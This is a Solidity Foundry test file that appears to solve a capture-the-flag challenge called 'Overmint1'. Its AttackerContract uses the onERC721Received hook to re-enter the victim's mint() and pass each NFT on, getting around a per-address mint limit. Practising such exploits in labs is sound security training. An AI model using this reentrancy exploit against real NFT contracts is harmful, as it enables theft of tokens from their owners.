// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {Overmint1} from "src/CTFs/Overmint1.sol";





contract Overmint1Attacker is Test {

    AttackerContract attackerContract;
    Overmint1 victim;

    address public attacker = address(0x10);

    function setUp() external {
        attackerContract = new AttackerContract();
        victim = new Overmint1();
    }


    function test_AttackerContract() external{
        console.log("address(attacker)",address(attacker));
        console.log("Overmint1Attacker",address(attackerContract));
        console.log("victim",address(victim));
        vm.startPrank(attacker);
        

        // attacking....
        attackerContract.callVictimsMint(address(victim));
        vm.stopPrank();

        console.log(victim.balanceOf(attacker));
        
        require(victim.success(attacker));
    }


}

contract AttackerContract is IERC721Receiver{

    address attackerAddress;

    function callVictimsMint(address victimsAddress) external {
        attackerAddress = msg.sender;
        Overmint1(victimsAddress).mint();
    }

     function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4)
    {
        // msg.sender == victim 
        console.log("from,msg.sender,attackerAddress",from,msg.sender,attackerAddress);

        // confirm the msg.sender   
        if(Overmint1(msg.sender).balanceOf(attackerAddress) < 5){
            // each time received the nft, directly send to the attacker
            Overmint1(msg.sender).safeTransferFrom(address(this),attackerAddress,tokenId);
            Overmint1(msg.sender).mint();
        }

        return IERC721Receiver.onERC721Received.selector;
    }
}
